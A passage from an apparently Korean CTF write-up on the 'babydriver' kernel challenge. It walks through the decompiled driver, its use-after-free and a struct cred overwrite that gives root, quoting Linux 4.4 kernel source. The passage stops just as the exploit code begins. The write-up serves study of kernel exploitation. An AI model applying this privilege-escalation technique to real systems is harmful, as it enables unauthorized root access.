title="babyrelease()"></a>babyrelease()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);</span><br><span class="line">  printk(<span class="string">"device release\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>babyrelease()</code>는 해당 디바이스를 <code>close()</code>할 경우 호출되는 함수입니다.<br><code>device_buf</code> 멤버에 저장된 주소를 해제합니다.</p><p><code>babyioctl()</code>함수와 다르게 <code>babydev_sturct</code> 구조체의 멤버들을 새로 저장하지 않습니다.<br>즉, heap 할당을 관리하는 구조체가 해제된 포인터를 가르키게 됩니다. <strong>(dangling pointer)</strong></p><h5 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite()"></a>babywrite()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_from_user();</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>전달받은 세 번째 인자가 <code>device_buf_len</code>보다 작을 경우 <code>copy_from_user()</code> 함수를 이용해 두 번째 인자로 전달받은 유저 공간의 데이터를 커널 영역에 전달합니다.</p><h5 id="babyread"><a href="#babyread" class="headerlink" title="babyread()"></a>babyread()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; v4 )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 = v4;</span><br><span class="line">    copy_to_user(buffer);</span><br><span class="line">    result = v6;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>전달받은 세 번째 인자가 <code>device_buf_len</code>보다 작을 경우 <code>copy_to_user()</code> 함수를 이용해 커널 영역의 데이터를 두 번째 인자로 전달받은 유저 공간에 받아옵니다.</p><h5 id="babydriver-init"><a href="#babydriver-init" class="headerlink" title="babydriver_init()"></a>babydriver_init()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">babydriver_init</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> *<span class="title">v2</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)alloc_chrdev_region(&amp;babydev_no, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="string">"babydev"</span>) &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    cdev_init(&amp;cdev_0, &amp;fops);</span><br><span class="line">    cdev_0.owner = &amp;_this_module;</span><br><span class="line">    v1 = cdev_add(&amp;cdev_0, babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = (class *)_class_create(&amp;_this_module, <span class="string">"babydev"</span>, &amp;babydev_no);</span><br><span class="line">      babydev_class = v2;</span><br><span class="line">      <span class="keyword">if</span> ( v2 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = device_create(v2, <span class="number">0L</span>L, babydev_no, <span class="number">0L</span>L, <span class="string">"babydev"</span>);</span><br><span class="line">        v0 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v3 )</span><br><span class="line">          <span class="keyword">return</span> v0;</span><br><span class="line">        printk(&amp;unk_351);</span><br><span class="line">        class_destroy(babydev_class);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        printk(&amp;unk_33B);</span><br><span class="line">      &#125;</span><br><span class="line">      cdev_del(&amp;cdev_0);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      printk(&amp;unk_327);</span><br><span class="line">    &#125;</span><br><span class="line">    unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">    <span class="keyword">return</span> v1;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(&amp;unk_309);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>해당 모듈이 커널에 추가될 경우 실행되는 함수입니다.</p><h5 id="babydriver-exit"><a href="#babydriver-exit" class="headerlink" title="babydriver_exit()"></a>babydriver_exit()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> __<span class="function">cdecl <span class="title">babydriver_exit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  device_destroy(babydev_class, babydev_no);</span><br><span class="line">  class_destroy(babydev_class);</span><br><span class="line">  cdev_del(&amp;cdev_0);</span><br><span class="line">  unregister_chrdev_region(babydev_no, <span class="number">1L</span>L);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>해당 모듈이 커널에서 제거될 경우 실행되는 함수입니다.</p><h3 id="취약점-체이닝"><a href="#취약점-체이닝" class="headerlink" title="취약점 체이닝"></a>취약점 체이닝</h3><p>모듈의 크기가 작은만큼 취약점은 간단합니다.</p><p><code>babyioctl()</code> 함수로 원하는 크기의 heap 영역을 할당할 수 있고 디바이스를 <code>close()</code> 하면 실행되는 <code>babyrelease()</code> 함수를 이용해 <code>dangling pointer</code>를 연출할 수 있습니다.<br>또한 heap 할당을 관리하는 구조체가 전역 변수로 선언되어 있기 때문에, 서로 다른 file descriptor에서 같은 구조체를 참조합니다.</p><p>즉 uaf 취약점이 터지며 이를 이용해 중요한 데이터가 담긴 heap 영역을 공격자 임의대로 수정할 수 있습니다.</p><p>이를 이용해 <code>struct cred</code> , <code>struct tty_sturct</code>를 이용한 두 가지 방법으로 풀 수 있습니다.</p><hr><h2 id="struct-cred-exploit"><a href="#struct-cred-exploit" class="headerlink" title="struct cred exploit"></a>struct cred exploit</h2><p><code>struct cred</code>를 이용한 exploit 과정을 간단히 설명하자면 다음과 같습니다.</p><ol><li>디바이스를 두 번 <code>open()</code>합니다. (<code>baby1</code>, <code>baby2</code>)</li><li><code>baby1</code> file descriptor에서 <code>babyioctl()</code> 함수를 이용해 <code>struct cred</code>의 크기인 168byte 만큼의 heap을 할당합니다.</li><li><code>baby1</code>를 <code>close()</code>하여 <code>babyrelease()</code> 함수를 호출해 할당된 heap을 해제합니다. 여기서 heap 영역을 해제한 뒤 해당 주소를 저장한 구조체 멤버를 초기화하지 않아 <code>dangling pointer</code>가 발생합니다.</li><li>유저 공간에서 <code>fork()</code> 함수를 호출합니다.</li><li><code>baby2</code>에서 <code>babywrite()</code> 함수를 이용해 해제된 heap 영역에 할당된 <code>struct cred</code>의 <code>uid</code>와 <code>gid</code>멤버를 0으로 덮어씁니다. (root 권한 획득)</li><li>자식 프로세스에서 <code>system(&quot;/bin/sh&quot;);</code>를 실행합니다.</li></ol><p>유저 공간에서 <code>fork()</code> 함수를 호출할 경우 <code>struct cred</code>를 커널 메모리 공간에 할당하는 작업을 진행합니다.</p><p>지금부터 문제 커널 버전인 <code>linux kernel v4.4.72</code>의 소스 코드를 보며 exploit 원리를 설명하겠습니다.</p><h5 id="fork"><a href="#fork" class="headerlink" title="fork()"></a>fork()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> _do_fork(<span class="keyword">unsigned</span> <span class="keyword">long</span> clone_flags,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_start,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_size,</span><br><span class="line">        <span class="keyword">int</span> __user *parent_tidptr,</span><br><span class="line">        <span class="keyword">int</span> __user *child_tidptr,</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> tls)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">    <span class="keyword">int</span> trace = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> nr;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Determine whether and which event to report to ptracer.  When</span></span><br><span class="line"><span class="comment">     * called from kernel_thread or CLONE_UNTRACED is explicitly</span></span><br><span class="line"><span class="comment">     * requested, no event is reported; otherwise, report if the event</span></span><br><span class="line"><span class="comment">     * for the type of forking is enabled.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (!(clone_flags &amp; CLONE_UNTRACED)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (clone_flags &amp; CLONE_VFORK)</span><br><span class="line">            trace = PTRACE_EVENT_VFORK;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> ((clone_flags &amp; CSIGNAL) != SIGCHLD)</span><br><span class="line">            trace = PTRACE_EVENT_CLONE;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            trace = PTRACE_EVENT_FORK;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (likely(!ptrace_event_enabled(current, trace)))</span><br><span class="line">            trace = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    p = copy_process(clone_flags, stack_start, stack_size,      <span class="comment">// here</span></span><br><span class="line">            child_tidptr, <span class="literal">NULL</span>, trace, tls, NUMA_NO_NODE);</span><br></pre></td></tr></table></figure><p>위 코드는 <code>fork.c</code> 소스 코드의 main routine 부분입니다. 해당 코드를 보면 <code>copy_process()</code> 함수를 호출하는 것을 확인할 수 있습니다.</p><h5 id="copy-process"><a href="#copy-process" class="headerlink" title="copy_process()"></a>copy_process()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PROVE_LOCKING</span></span><br><span class="line">DEBUG_LOCKS_WARN_ON(!p-&gt;hardirqs_enabled);</span><br><span class="line">DEBUG_LOCKS_WARN_ON(!p-&gt;softirqs_enabled);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">retval = -EAGAIN;</span><br><span class="line"><span class="keyword">if</span> (atomic_read(&amp;p-&gt;real_cred-&gt;user-&gt;processes) &gt;=</span><br><span class="line">task_rlimit(p, RLIMIT_NPROC)) &#123;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;real_cred-&gt;user != INIT_USER &amp;&amp;</span><br><span class="line">    !capable(CAP_SYS_RESOURCE) &amp;&amp; !capable(CAP_SYS_ADMIN))</span><br><span class="line"><span class="keyword">goto</span> bad_fork_free;</span><br><span class="line">&#125;</span><br><span class="line">current-&gt;flags &amp;= ~PF_NPROC_EXCEEDED;</span><br><span class="line"></span><br><span class="line">retval = copy_creds(p, clone_flags);<span class="comment">// here</span></span><br><span class="line"><span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> bad_fork_free;</span><br></pre></td></tr></table></figure><p>위 코드 또한 <code>fork.c</code> 소스 코드의 <code>copy_process()</code> 함수 부분입니다. 해당 코드를 보면 <code>copy_creds()</code> 함수를 호출해 반환값을 <code>retval</code> 변수에 저장하는 것을 확인할 수 있습니다.</p><h5 id="copy-creds"><a href="#copy-creds" class="headerlink" title="copy_creds()"></a>copy_creds()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">copy_creds</span><span class="params">(struct task_struct *p, <span class="keyword">unsigned</span> <span class="keyword">long</span> clone_flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (</span><br><span class="line">#ifdef CONFIG_KEYS</span><br><span class="line">!p-&gt;cred-&gt;thread_keyring &amp;&amp;</span><br><span class="line">#endif</span><br><span class="line">clone_flags &amp; CLONE_THREAD</span><br><span class="line">    ) &#123;</span><br><span class="line">p-&gt;real_cred = get_cred(p-&gt;cred);</span><br><span class="line">get_cred(p-&gt;cred);</span><br><span class="line">alter_cred_subscribers(p-&gt;cred, <span class="number">2</span>);</span><br><span class="line">kdebug(<span class="string">"share_creds(%p&#123;%d,%d&#125;)"</span>,</span><br><span class="line">       p-&gt;cred, atomic_read(&amp;p-&gt;cred-&gt;usage),</span><br><span class="line">       read_cred_subscribers(p-&gt;cred));</span><br><span class="line">atomic_inc(&amp;p-&gt;cred-&gt;user-&gt;processes);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = prepare_creds();   <span class="comment">// here</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clone_flags &amp; CLONE_NEWUSER) &#123;</span><br><span class="line">ret = create_user_ns(<span class="keyword">new</span>);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> error_put;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 코드는 <code>cred.c</code> 소스 코드 내의 <code>copy_creds</code> 함수 도입 부분입니다. 해당 코드를 보면 <code>prepare_creds()</code> 함수를 호출하는 것을 볼 수 있습니다.</p><h5 id="prepare-creds"><a href="#prepare-creds" class="headerlink" title="prepare_creds()"></a>prepare_creds()</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * prepare_creds - Prepare a new set of credentials for modification</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Prepare a new set of task credentials for modification.  A task's creds</span></span><br><span class="line"><span class="comment"> * shouldn't generally be modified directly, therefore this function is used to</span></span><br><span class="line"><span class="comment"> * prepare a new copy, which the caller then modifies and then commits by</span></span><br><span class="line"><span class="comment"> * calling commit_creds().</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Preparation involves making a copy of the objective creds for modification.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns a pointer to the new creds-to-be if successful, NULL otherwise.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Call commit_creds() or abort_creds() to clean up.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function">struct cred *<span class="title">prepare_creds</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span> = <span class="title">current</span>;</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">old</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> *<span class="title">new</span>;</span></span><br><span class="line"></span><br><span class="line">validate_process_creds();</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> = kmem_cache_alloc(cred_jar, GFP_KERNEL);    <span class="comment">// here</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">new</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure><p>위 코드 또한 <code>cred.c</code> 내의 <code>prepare_creds</code> 함수 도입 부분입니다. 해당 코드를 보면 <code>kmem_cache_alloc()</code> 함수를 호출해서 반환값을 변수 new에 저장하는 것을 확인할 수 있습니다.</p><p>바로 이 코드가 heap 영역에 <code>sizeof(struct cred)</code>만큼의 크기를 할당해서 해당 영역에 자식 프로세스의 권한 증명이 담긴 <code>struct cred</code>를 저장하는 코드입니다.</p><h5 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line"><span class="keyword">atomic_t</span>usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line"><span class="keyword">atomic_t</span>subscribers;<span class="comment">/* number of processes subscribed */</span></span><br><span class="line"><span class="keyword">void</span>*put_addr;</span><br><span class="line"><span class="keyword">unsigned</span>magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="keyword">kuid_t</span>uid;<span class="comment">/* real UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>gid;<span class="comment">/* real GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>suid;<span class="comment">/* saved UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>sgid;<span class="comment">/* saved GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>euid;<span class="comment">/* effective UID of the task */</span></span><br><span class="line"><span class="keyword">kgid_t</span>egid;<span class="comment">/* effective GID of the task */</span></span><br><span class="line"><span class="keyword">kuid_t</span>fsuid;<span class="comment">/* UID for VFS ops */</span></span><br><span class="line"><span class="keyword">kgid_t</span>fsgid;<span class="comment">/* GID for VFS ops */</span></span><br><span class="line"><span class="keyword">unsigned</span>securebits;<span class="comment">/* SUID-less security management */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_permitted;<span class="comment">/* caps we're permitted */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_effective;<span class="comment">/* caps we can actually use */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_bset;<span class="comment">/* capability bounding set */</span></span><br><span class="line"><span class="keyword">kernel_cap_t</span>cap_ambient;<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>jit_keyring;<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment"> * keys to */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">key</span>*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line"><span class="keyword">void</span>*security;<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span><span class="comment">/* real user ID subscription */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span><span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span><span class="title">rcu</span>;</span><span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>strcut cred</code>는 위와 같이 구성되어 있으며 이 중 <code>kuid_t uid</code>와 <code>kgid_t gid</code> 멤버의 값을 0으로 만들어 주면, 해당 프로세스는 root의 권한을 가지게 됩니다.</p><p>즉 유저 공간에서 <code>fork()</code> 함수를 호출하면 <code>babyrelease()</code>함수로 해제된 168byte 만큼의 heap 영역에 <code>struct cred</code>가 들어오게 되고, 해당 영역에 대한 <code>dangling pointer</code>를 가지고 있는 <code>babydev_struct.device_buf</code>를 이용해 <code>struct cred</code>를 0으로 덮어주면 root 권한을 획득하게 되는 것입니다.</p><h5 id="exploit-code"><a href="#exploit-code" class="headerlink" title="exploit code"></a>exploit code</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 